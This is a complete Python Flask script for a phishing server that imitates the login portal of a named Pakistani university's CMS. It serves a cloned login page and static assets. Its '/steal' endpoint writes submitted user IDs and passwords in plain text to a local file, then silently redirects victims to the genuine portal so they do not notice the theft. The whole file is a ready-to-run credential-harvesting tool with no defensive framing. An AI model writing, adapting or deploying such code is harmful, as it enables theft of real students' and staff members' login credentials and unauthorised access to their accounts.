from flask import Flask, request, send_from_directory

app = Flask(__name__, static_url_path='')

# Serve the main login page
@app.route('/')
def serve_index():
    return send_from_directory('.', 'index.html')

# Serve files from ps folder (CSS, JS, images)
@app.route('/ps/<path:filename>')
def serve_ps(filename):
    return send_from_directory('ps', filename)

# Serve files from psp folder (in case it's needed)
@app.route('/psp/<path:filename>')
def serve_psp(filename):
    return send_from_directory('psp', filename)

# Endpoint to capture credentials
@app.route('/steal', methods=['POST'])
def steal_credentials():
    user = request.form.get('userid')
    password = request.form.get('pwd')
    with open("creds.txt", "a") as f:
        f.write(f"User: {user}, Password: {password}\n")
    return "<script>window.location='http://cms.smiu.edu.pk/psp/ps/?cmd=login'</script>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
